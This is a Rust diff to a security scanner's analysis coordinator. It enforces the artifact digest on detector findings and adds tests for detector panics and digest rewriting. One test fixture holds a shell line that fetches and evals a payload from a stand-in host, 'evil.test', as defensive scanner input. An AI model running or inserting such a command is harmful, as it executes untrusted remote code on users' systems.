@@ -172,14 +172,21 @@ fn run_detector(
     metadata: DetectorMetadata,
 ) -> DetectorExecution {
     match catch_unwind(AssertUnwindSafe(|| detector.analyze(ctx))) {
-        Ok(findings) => DetectorExecution {
-            result: DetectorResult {
-                metadata,
-                status: DetectorStatus::Ok,
-                finding_count: findings.len(),
-            },
-            findings,
-        },
+        Ok(raw_findings) => {
+            // Enforce finding digest integrity centrally: every finding must
+            // reference the artifact SHA-256 from the analysis context,
+            // regardless of what the detector set. This prevents buggy or
+            // compromised detectors from attributing findings to wrong artifacts.
+            let findings = rewrite_artifact_digest(raw_findings, &ctx.artifact_sha256);
+            DetectorExecution {
+                result: DetectorResult {
+                    metadata,
+                    status: DetectorStatus::Ok,
+                    finding_count: findings.len(),
+                },
+                findings,
+            }
+        }
         Err(payload) => DetectorExecution {
             findings: Vec::new(),
             result: DetectorResult {
@@ -450,7 +457,9 @@ fn digest(data: &[u8]) -> Sha256Digest {
 
 #[cfg(test)]
 mod tests {
-    use super::{AnalysisContext, AnalysisCoordinator, Detector, DetectorStatus, RetrievalInfo};
+    use super::{
+        AnalysisContext, AnalysisCoordinator, Detector, DetectorStatus, RetrievalInfo, digest,
+    };
     use arbitraitor_artifact::ArtifactType;
     use arbitraitor_model::artifact::ArtifactKind;
     use arbitraitor_model::finding::{DetectorMetadata, Evidence, Finding, FindingCategory};
@@ -535,6 +544,63 @@ mod tests {
         assert_eq!(result.findings[0].title, "retrieval metadata observed");
     }
 
+    #[test]
+    fn panicking_detector_does_not_prevent_others_from_running() {
+        let coordinator = AnalysisCoordinator::with_detectors(vec![
+            Box::new(FailingDetector),
+            Box::new(RecordingDetector::new("survivor.detector")),
+        ]);
+
+        let result = coordinator.analyze(b"not empty");
+
+        assert_eq!(result.detector_results.len(), 2);
+        assert!(matches!(
+            result.detector_results[0].status,
+            DetectorStatus::Error(_)
+        ));
+        assert!(matches!(
+            result.detector_results[1].status,
+            DetectorStatus::Ok
+        ));
+        assert!(
+            result
+                .findings
+                .iter()
+                .any(|f| f.detector == "survivor.detector")
+        );
+        assert_eq!(result.verdict, Verdict::Incomplete);
+    }
+
+    #[test]
+    fn all_findings_carry_correct_artifact_digest() {
+        let coordinator = AnalysisCoordinator::new();
+        let bytes = b"#!/bin/bash\neval $(curl https://evil.test/payload)\n";
+        let expected = digest(bytes);
+
+        let result = coordinator.analyze(bytes);
+
+        assert!(!result.findings.is_empty());
+        for finding in &result.findings {
+            assert_eq!(
+                finding.artifact_sha256, expected,
+                "finding {} has wrong digest",
+                finding.id
+            );
+        }
+    }
+
+    #[test]
+    fn coordinator_overwrites_wrong_digest_from_detector() {
+        let coordinator = AnalysisCoordinator::with_detectors(vec![Box::new(WrongDigestDetector)]);
+        let bytes = b"plain text\n";
+        let expected = digest(bytes);
+
+        let result = coordinator.analyze(bytes);
+
+        assert_eq!(result.findings.len(), 1);
+        assert_eq!(result.findings[0].artifact_sha256, expected);
+    }
+
     struct RecordingDetector {
         id: &'static str,
     }
@@ -565,6 +631,32 @@ mod tests {
         fn analyze(&self, ctx: &AnalysisContext<'_>) -> Vec<Finding> {
             assert!(ctx.artifact_bytes.is_empty(), "forced detector failure");
             Vec::new()
+        }
+    }
+
+    struct WrongDigestDetector;
+
+    impl Detector for WrongDigestDetector {
+        fn metadata(&self) -> DetectorMetadata {
+            test_metadata("wrong-digest.detector")
+        }
+
+        fn analyze(&self, _ctx: &AnalysisContext<'_>) -> Vec<Finding> {
+            vec![Finding {
+                id: "wrong-digest.finding".to_owned(),
+                detector: "wrong-digest.detector".to_owned(),
+                category: FindingCategory::SuspiciousScriptBehavior,
+                severity: Severity::Low,
+                confidence: Confidence::High,
+                title: "wrong digest".to_owned(),
+                description: "detector set wrong digest".to_owned(),
+                evidence: Vec::<Evidence>::new(),
+                artifact_sha256: arbitraitor_model::ids::Sha256Digest::new([0xff; 32]),
+                location: None,
+                remediation: None,
+                references: Vec::new(),
+                tags: Vec::new(),
+            }]
         }
     }
 
